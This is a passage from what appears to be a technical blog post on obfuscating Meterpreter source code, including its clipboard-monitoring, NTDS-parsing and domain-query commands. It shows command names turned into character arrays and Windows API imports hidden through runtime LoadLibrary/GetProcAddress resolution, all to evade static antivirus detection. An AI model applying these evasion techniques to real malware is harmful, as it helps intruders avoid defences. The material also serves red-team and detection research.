</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_WcWbTrsQujiT</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'b'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pln"><span class="pln">
</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_rPiFTZW4ShwA</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'b'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pln"><span class="pln">
</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_05fAoaZLqOoy</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'b'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pln"><span class="pln">
</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'g'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_cOOyHTPTvZGK</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'b'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_smtmvW05cI9y</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'b'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_01kuYCM8z49k</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'q'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'y'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_SMK9uFj6nThk</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_PHxnGM7M0609</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'w'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'q'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'y'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_J7EGS6FRHwkV</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'g'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'q'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'y'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">

</span></span><span class="typ"><span class="typ">Command</span></span><span class="pln"><span class="pln"> customCommands</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_UQOoNXigAPq4</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_window_enum</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_vhFHmZ8u2hfz</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_service_enum</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_pW25eeIGBeru</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_service_query</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_S4Ws57MYBjib</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_service_control</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_HJ0lD9Dl56A4</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_clipboard_get_data</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_IiEzXils3UsR</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_clipboard_set_data</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_czLOBo0HcqCP</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_clipboard_monitor_start</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_WcWbTrsQujiT</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_clipboard_monitor_pause</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_rPiFTZW4ShwA</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_clipboard_monitor_resume</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_05fAoaZLqOoy</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_clipboard_monitor_purge</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_cOOyHTPTvZGK</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_clipboard_monitor_stop</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_smtmvW05cI9y</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_clipboard_monitor_dump</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_01kuYCM8z49k</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_adsi_domain_query</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_SMK9uFj6nThk</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> ntds_parse</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_PHxnGM7M0609</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_wmi_query</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_REQ</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_extapi_J7EGS6FRHwkV</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> request_pageant_send_query</span></span><span class="pun"><span class="pun">),</span></span><span class="pln"><span class="pln">
    COMMAND_TERMINATOR
</span></span><span class="pun"><span class="pun">};</span></span></code></pre>



<h3 class="wp-block-heading">Hiding API Imports</h3>



<p>Calling functions exported by external libraries causes the linker to write an entry into the<em> Import Address Table</em> (IAT). As a result, the function name will appear as clear-text within the binary, and thus can be recovered statically without even executing the malware. Of course, there are function names that are more suspicious than others. It would be wise to hide all the suspicious ones and keep the ones that are present in the majority of legitimate binaries.<br>For instance, in the <em>kiwi</em> extension of Metepreter, one can find the following line:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="pln"><span class="pln">enumStatus </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">SamEnumerateUsersInDomain</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hDomain</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">EnumerationContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="pln"><span class="pln">pEnumBuffer</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">100</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">CountRetourned</span></span><span class="pun"><span class="pun">);</span></span></code></pre>



<p>This function is exported by <em>samlib.dll</em>, so the linker will cause the strings “<em>samlib.dll</em>” and “<em>SamEnumerateUsersInDomain</em>” to appear in the compiled binary.</p>



<p>To solve this issue, it is possible to import the API at runtime using <em>LoadLibrary / GetProcAddresss</em>. Of course, both these functions work with strings, so they must be obfuscated as well. Thus, we would like to automatically rewrite the above snippet as follows:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">typedef</span></span><span class="pln"><span class="pln"> NTSTATUS</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">__stdcall</span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">_SamEnumerateUsersInDomain</span></span><span class="pun"><span class="pun">)(</span></span><span class="pln"><span class="pln">
    SAMPR_HANDLE </span></span><span class="typ"><span class="typ">DomainHandle</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
    PDWORD </span></span><span class="typ"><span class="typ">EnumerationContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
    DWORD </span></span><span class="typ"><span class="typ">UserAccountControl</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
    PSAMPR_RID_ENUMERATION</span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Buffer</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
    DWORD </span></span><span class="typ"><span class="typ">PreferedMaximumLength</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
    PDWORD </span></span><span class="typ"><span class="typ">CountReturned</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
